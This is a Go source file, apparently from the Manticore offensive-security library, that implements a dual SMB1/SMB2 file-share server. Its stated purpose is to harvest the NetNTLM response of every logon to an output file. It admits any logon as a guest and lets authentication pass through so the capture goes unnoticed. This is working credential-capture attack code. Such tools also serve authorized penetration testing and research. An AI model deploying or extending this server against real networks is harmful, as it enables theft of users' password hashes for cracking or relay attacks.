package server

import (
	"fmt"
	"net"

	"github.com/TheManticoreProject/Manticore/logger"
	"github.com/TheManticoreProject/Manticore/network/smb/common/transport"
	smb1message "github.com/TheManticoreProject/Manticore/network/smb/smb_v10/message"
	smb1commands "github.com/TheManticoreProject/Manticore/network/smb/smb_v10/message/commands"
	smb1codes "github.com/TheManticoreProject/Manticore/network/smb/smb_v10/message/commands/codes"
	smb1 "github.com/TheManticoreProject/Manticore/network/smb/smb_v10/server"
	smb2 "github.com/TheManticoreProject/Manticore/network/smb/smb_v20/server"
)

// Options configures a Server.
type Options struct {
	ShareName string
	SharePath string
	ReadOnly  bool

	ListenAddress string
	Port          int
	UseNBT        bool
	ServerName    string
	Domain        string

	// Account is the account served. Nil admits every logon as a guest, which is
	// what a capture wants.
	Account *smb1.Account

	RequireSigning    bool
	RequireEncryption bool

	EnableSMB1 bool
	EnableSMB2 bool

	OutputFile string
}

// Server serves one share over SMB1 and SMB2/3 on a single listener, routing
// each connection on its first NEGOTIATE, and harvests the NetNTLM response of
// every logon on both.
type Server struct {
	options Options
	smb1    *smb1.Server
	smb2    *smb2.Server
}

// NewServer builds the SMB1 and SMB2 servers the options enable.
func NewServer(options Options) (*Server, error) {
	if !options.EnableSMB1 && !options.EnableSMB2 {
		return nil, fmt.Errorf("at least one of SMB1 and SMB2 must be enabled")
	}
	if options.RequireEncryption && options.EnableSMB1 {
		return nil, fmt.Errorf("SMB1 has no encryption, disable it to require encryption")
	}

	fs, err := smb1.NewLocalFileSystem(options.SharePath, options.ShareName)
	if err != nil {
		return nil, err
	}
	fs.SetReadOnly(options.ReadOnly)

	// One capture handler for both protocols, so the output file and the
	// per-user deduplication are shared. Known accounts are still served
	// (pass-through); the rest fall to the guest or logon-failure policy.
	capture, err := smb2.NewCaptureHandler(smb2.CaptureConfig{
		CaptureConfig: smb1.CaptureConfig{OutputFile: options.OutputFile, UniquePerUser: true},
		PassThrough:   true,
	})
	if err != nil {
		return nil, err
	}

	var authenticator func(domain, username string) ([16]byte, bool)
	if options.Account != nil {
		authenticator = smb1.StaticAccounts(*options.Account)
	}
	guest := options.Account == nil

	s := &Server{options: options}
	if options.EnableSMB1 {
		signing := smb1.SigningEnabled
		if options.RequireSigning {
			signing = smb1.SigningRequired
		}
		s.smb1, err = smb1.NewServer(smb1.Config{
			ServerName:      options.ServerName,
			DomainName:      options.Domain,
			DNSComputerName: options.ServerName,
			DNSDomainName:   options.Domain,
			Authenticator:   authenticator,
			AllowGuest:      guest,
			AllowAnonymous:  guest,
			SigningPolicy:   signing,
		})
		if err != nil {
			return nil, err
		}
		s.smb1.RegisterHandler(passThroughCapture(capture.CaptureHandler))
		share := &smb1.Share{Name: options.ShareName, Type: smb1.ShareTypeDisk, FS: fs, ReadOnly: options.ReadOnly}
		if err := s.smb1.AddShare(share); err != nil {
			return nil, err
		}
	}
	if options.EnableSMB2 {
		s.smb2, err = smb2.NewServer(smb2.Config{
			ServerName:        options.ServerName,
			DomainName:        options.Domain,
			DNSComputerName:   options.ServerName,
			DNSDomainName:     options.Domain,
			Authenticator:     authenticator,
			AllowGuest:        guest,
			AllowAnonymous:    guest,
			RequireSigning:    options.RequireSigning,
			RequireEncryption: options.RequireEncryption,
		})
		if err != nil {
			return nil, err
		}
		s.smb2.RegisterHandler(capture)
		// ponytail: the SMB1 and SMB2 shares are separate, so byte-range locks
		// do not span protocols; share one smb1.Share if a client mixes them.
		share := &smb2.Share{Name: options.ShareName, FS: fs, ReadOnly: options.ReadOnly}
		if err := s.smb2.AddShare(share); err != nil {
			return nil, err
		}
	}
	return s, nil
}

// ListenAndServe accepts connections until the listener fails.
func (s *Server) ListenAndServe() error {
	addr := fmt.Sprintf("%s:%d", s.options.ListenAddress, s.options.Port)
	var listener transport.Listener
	var err error
	if s.options.UseNBT {
		listener, err = transport.ListenNBT(addr, []string{s.options.ServerName})
	} else {
		listener, err = transport.ListenTCP(addr)
	}
	if err != nil {
		return err
	}
	defer listener.Close()

	logger.Info(fmt.Sprintf("Serving %s as \\\\%s\\%s on %s (%s)", s.options.SharePath, s.options.ServerName, s.options.ShareName, listener.Addr(), s.protocols()))
	for {
		t, remote, err := listener.Accept()
		if err != nil {
			return fmt.Errorf("failed to accept an SMB connection: %v", err)
		}
		go s.serveConn(t, remote)
	}
}

// serveConn hands a connection to the server its first frame calls for.
func (s *Server) serveConn(t transport.Transport, remote net.Addr) {
	var err error
	switch {
	case s.smb2 == nil:
		err = s.smb1.ServeConn(t, remote)
	case s.smb1 == nil:
		err = s.smb2.ServeConn(t, remote)
	default:
		var first []byte
		if first, err = t.Receive(); err != nil {
			t.Close()
			break
		}
		replay := &replayTransport{Transport: t, first: first}
		protocol := route(first)
		logger.Debug(fmt.Sprintf("Serving %s over %s", remote, protocol))
		if protocol == SMB1 {
			err = s.smb1.ServeConn(replay, remote)
		} else {
			err = s.smb2.ServeConn(replay, remote)
		}
	}
	if err != nil {
		logger.Debug(fmt.Sprintf("Refusing %s: %v", remote, err))
	}
}

func (s *Server) protocols() string {
	switch {
	case s.smb1 == nil:
		return "SMB 2/3"
	case s.smb2 == nil:
		return "SMB1"
	}
	return "SMB1, SMB 2/3"
}

// passThroughCapture records the AUTHENTICATE leg of an SMB1 session setup and
// lets the logon proceed, as the SMB2 capture handler does with PassThrough;
// the SMB1 capture handler alone always refuses it.
func passThroughCapture(capture *smb1.CaptureHandler) smb1.Handler {
	return smb1.HandlerFunc(func(srv *smb1.Server, conn *smb1.Connection, w smb1.ResponseWriter, req *smb1message.Message) bool {
		if req.Header.Command != smb1codes.SMB_COM_SESSION_SETUP_ANDX {
			return false
		}
		accept := conn.PendingAuth(uint16(req.Header.UID))
		request, ok := req.Command.(*smb1commands.SessionSetupAndxRequest)
		if accept == nil || !ok || len(request.SecurityBlob) == 0 || accept.AcceptAuthenticateToken([]byte(request.SecurityBlob)) != nil {
			return false
		}
		capture.Record(conn.Remote, accept)
		return false
	})
}
